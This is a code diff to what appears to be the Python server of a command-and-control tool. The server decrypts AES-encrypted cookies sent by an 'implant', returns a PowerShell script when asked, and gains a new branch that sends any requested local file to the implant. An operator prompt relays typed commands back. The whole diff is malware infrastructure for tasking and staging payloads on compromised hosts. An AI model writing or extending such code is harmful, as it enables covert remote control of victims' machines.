@@ -25,12 +25,9 @@ def handle_post():
         encrypted = b64decode(cookie)
         decrypted = cipher_dec.decrypt(encrypted)
         message = unpad(decrypted, 16)
-        
-        # print("Received data     : ", data)
-        # print("Received cookie   : ", cookie)
-        # print("Base64 Decoded    : ", encrypted)
-        # print("Decrypted         : ", decrypted)
-        print("Message           : ", message.decode("utf8"))
+
+        print("Message           :")
+        print(message.decode("utf8"))
 
         # Implant requested powershell script
         if message == b"SCRIPT":
@@ -39,6 +36,15 @@ def handle_post():
             fd.close()
             script_enc = cipher_enc.encrypt(pad(script, 16))
             return b64encode(script_enc)
+        
+        # Implant requested local file
+        elif message.startswith(b"FILE:"):
+            filename = message[5:]
+            fd = open(filename, "rb")
+            data = fd.read()
+            fd.close()
+            file_enc = cipher_enc.encrypt(pad(data, 16))
+            return b64encode(file_enc)
 
 
         # Get user input.
@@ -46,9 +52,11 @@ def handle_post():
         user_input = b""
         while len(user_input) == 0:
             user_input = input("> ").encode()
+
             if user_input == b"clear":
                 os.system("clear")
                 user_input = b""
+
 
 
         response = cipher_enc.encrypt(pad(user_input, 16))
